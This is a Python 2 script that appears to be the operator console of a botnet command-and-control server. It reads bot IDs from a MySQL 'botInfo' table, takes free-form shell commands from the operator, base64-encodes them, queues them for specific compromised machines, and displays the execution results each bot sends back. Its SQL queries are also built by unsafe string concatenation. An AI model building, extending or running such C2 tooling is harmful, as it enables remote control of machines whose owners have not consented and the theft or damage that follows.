#!/usr/bin/python

import MySQLdb
import sys
import base64
import ConfigParser

def sendCommand(botID, osT, c, db):
	print
	print "Send the following command to machineID: " + botID
	selection = raw_input("$ ")
	encodedSelection = base64.b64encode(selection)
	if len(selection) > 1:
		sql = "INSERT INTO botInfo (machineID, osType, httpCommand, executed) VALUES ('" + botID + "','" + osT + "','" + encodedSelection + "','N')"
		c.execute(sql)
		db.commit()
	controlBot(botID, c, db)

def displayResults(actionID, c, db):
	sql = "SELECT id, machineID, osType, httpCommand, httpResults, executed FROM botInfo WHERE id=" + actionID
	c.execute(sql)
	db.commit()
	if (c.rowcount > 0):
		for row in c.fetchall():
			id = actionID
			botID = row[1]
			osType = row[2]
			httpCommand = base64.b64decode(row[3])
			httpResults = base64.b64decode(row[4])
			executed = row[5]
			print
			print "Action ID: " + id + "  BotID: " + botID + " OS Type: " + osType
			print
			if executed == 'Y':
				print "Command Executed: " + httpCommand
				print
				print httpResults
				print
			else:
				print "Command is Pending: " + httpCommand
				print


def controlBot(botID, cur, db):
	while True:
		sql = "SELECT id, osType, httpCommand, executed FROM botInfo WHERE machineID='" + botID + "'"
		cur.execute(sql)
		db.commit()
		if (cur.rowcount > 0):
			print 
			print "Command History for BotID " + botID
			print "Select the number preceeding the command to view the results of the command."
			print
			idList = []
			for row in cur.fetchall():
				id = row[0]
				idList.append(row[0])
				machineID = botID
				osType = row[1]
				httpCommand = base64.b64decode(row[2])
				executed = row[3]
				print str(id) + ": Results Exist: " + executed + " Command: " + httpCommand
			print
			print "I. Issue New Command to Bot"
			print "R. Refresh"
			print "Q. Return to Main"
			selection = raw_input("$ ")
			if (selection == 'I') | (selection == 'i'):
				sendCommand(machineID, osType, cur, db)
			elif (selection == 'Q') | (selection == 'q'):
				main()
			elif int(selection) in idList:
				displayResults(selection, cur, db)
			else:
				continue
		else:
			print "Invalid numerical selection."
			break


def main():
	config = ConfigParser.ConfigParser()
	config.read("config.ini")
	myHost = config.get('Database', 'dbHost')
	myUser = config.get('Database', 'dbUser')
	myPass = config.get('Database', 'dbPass')
	myDB = config.get('Database', 'dbName')
	db = MySQLdb.connect(host=myHost, user=myUser, passwd=myPass, db=myDB)
	cursor = db.cursor()
	while True:
		print 
		print "Select the number preceding the botID to interact with it:"
		print
		sql = "SELECT machineID, id FROM botInfo ORDER BY id DESC"
		cursor.execute(sql)
		db.commit()
		if (cursor.rowcount > 0):
			botList = []
			idList = []
			count = 0
			for row in cursor.fetchall():
				if not row[0] in botList:
					botList.append(row[0])
					idList.append(count)
					count += 1
			for i in range(0, len(idList)):
				print str(i) + ". BotID:" + str(botList[i])
		print
		print "R. Refresh"
		print "Q. Quit"
		selection = raw_input("$ ")
		if (selection == 'Q') | (selection == 'q'):
			sys.exit(0)
		elif (selection == 'R') | (selection == 'r'):
			continue
		elif int(selection) in idList:
			controlBot(botList[int(selection)], cursor, db)
		else:
			continue
	cursor.close()
	del cursor
	db.close()

if __name__ == "__main__":
        main()

